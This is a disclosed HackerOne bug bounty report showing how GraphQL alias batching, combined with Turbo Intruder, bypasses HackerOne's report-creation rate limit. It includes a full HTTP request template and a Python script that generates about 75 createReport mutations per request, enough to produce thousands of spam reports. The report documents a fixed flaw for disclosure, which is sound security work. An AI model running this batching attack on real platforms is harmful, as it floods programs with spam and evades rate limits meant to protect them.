# Ability to bulk submit reports via query named based batching

## Report Details
- **Report ID**: 2166697
- **URL**: https://hackerone.com/reports/2166697
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-09-16T10:05:59.526Z
- **Disclosed**: 2024-06-19T06:38:15.294Z

## Reporter
- **Username**: 0x999
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
By taking advantage of query named based batching in graphql a malicious actor has the ability to create many reports in bulk(up to ~75+ reports in 1 request), in combination with turbo intruder this can be abused to create ~6400+ reports using ~100 requests in roughly 40 seconds which goes well above the intended limit which is 500 according to [this](https://hackerone.com/reports/2000000) report

**Description:**

### Steps To Reproduce

1. Paste the following request in BurpSuite - 
```
POST /graphql HTTP/2
Host: hackerone.com
Cookie: {your-h1-cookie)
Content-Length: 1173
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
X-Csrf-Token: {your-csrf-token}
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Content-Type: application/json
X-Product-Feature: inbox
Accept: */*
X-Product-Area: reports
Sec-Ch-Ua-Platform: "Linux"
Origin: https://hackerone.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{
"operationname": "CreateReport",
"variables":{
"team_handle":"{target-team-handle}",
"product_area":"reports",
"product_feature":"inbox"
},
  "query": "{your-generated-query}"
}
```
2. Replace the Cookies, X-CSRF-Token with your own as well as the "{target-team-handle}"  with the team handle you wish to create the reports on
3. Use the python script that is included below to generate the query and replace {your-generated-query} in the request with the output
4. Send the request to Turbo Intruder
5. Use the ```race-single-packet-attack.py``` script
6. Modify the loop to 100 iterations and start the attack
7. Wait for the requests to go through 
8. Refresh H1 and you will see ~6400+ reports were created


### Supporting Material/References (Screenshots)

Video POC:
 * ██████████

Generate mutation query:
```python
def generate_query(index):
    return (
        'example' + str(index) + ': createReport(input: {team_handle: $team_handle, '
        'title: "Your Report Title", vulnerability_information: "Vulnerability Information", '
        'impact: "Impact Description", source: "Report Source"}) { '
        'was_successful errors { edges { node { id error_code field message __typename } __typename } '
        '__typename } }'
    )
queries = []
for i in range(75):
    queries.append(generate_query(i))
main_mutation = (
    'mutation BulkReports($team_handle: String!) {\n  ' +
    '\n  '.join(queries) +
    '\n}'
)
print(repr(main_mutation).replace('"','\\"').replace("'",""))

```

## Impact

By taking advantage of this bug a malicious actor is able to bypass the intended limitations that are applied to the report creation request allowing them to spam any program with a very large amount of reports.


## Attachments
No attachments
